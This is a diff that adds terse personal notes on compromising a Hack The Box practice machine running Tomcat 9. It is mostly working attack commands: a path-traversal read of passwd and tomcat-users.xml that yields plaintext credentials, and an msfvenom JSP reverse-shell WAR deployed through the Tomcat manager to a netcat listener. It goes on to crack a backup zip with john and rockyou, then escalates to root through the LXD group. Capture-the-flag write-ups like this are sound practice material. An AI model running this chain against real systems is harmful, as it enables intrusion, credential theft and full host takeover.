@@ -1,0 +1,36 @@
+//based on IppSec and bertolis
+
+tomcat 9 (8080), mega (80)
+10.10.10.194	www.megahosting.htb	//hosts
+GET /news.php?file=../../../../../../../../etc/passw
+ash			//user
+GET /news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+tomcat : $3cureP4s5w0rd123!
+
+Tomcat manager 9
+http://trabajosdesisifo.blogspot.com/2017/08/tomcat-manager-commands-cheat-sheet.html
+curl -u "tomcat":"\$3cureP4s5w0rd123!" http://10.10.10.194:8080/manager/text/list
+OK - Listed applications for virtual host [localhost]
+	/:running:0:ROOT
+	/examples:running:0:/usr/share/tomcat9-examples/examples
+	/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
+	/manager:running:0:/usr/share/tomcat9-admin/manager
+	/docs:running:0:/usr/share/tomcat9-docs/docs
+
+https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat
+https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/
+nc -lvnp 9001
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.25 LPORT=9001 -f war -o revshl.war
+curl --upload-file revshl.war -u "tomcat:\$3cureP4s5w0rd123!" "http://10.10.10.194:8080/manager/text/deploy?path=/monshell&update=true"		//got tomcat shell
+
+/var/www/html/16162020_backup.zip
+zip2john 16162020_backup.zip > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+ash : admin@it
+su - ash		//got user
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+//Follow method 1
+lxd init (for the storage)	//for errors
+//got root
+/mnt/root/root/root.txt
